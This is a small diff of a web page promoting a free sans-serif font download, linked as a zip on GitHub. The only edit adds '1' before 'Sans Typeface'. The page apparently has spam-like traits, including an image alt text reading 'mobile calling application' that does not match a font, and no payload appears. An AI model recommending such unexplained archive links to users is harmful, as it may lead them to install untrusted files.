@@ -4,7 +4,7 @@ Heres a unique original <a href="https://github.com/qp5/FONT/raw/main/FONT.zip">
 
 <a href="https://github.com/qp5/FONT/raw/main/FONT.zip"><img style="height: 380px; margin-bottom:-0px; margin-top:0px;" src="https://bowhip.org/img/font_thumb_publisher.png" alt="mobile calling application"></a> 
 
-Sans Typeface — plus 2 bonus fonts.<br>
+1 Sans Typeface — plus 2 bonus fonts.<br>
   Fonts simular to this include:  Sego | Source Sans Pro | Open Sans<br><br>
 
 If you create fonts, please join this light project! <br><br>
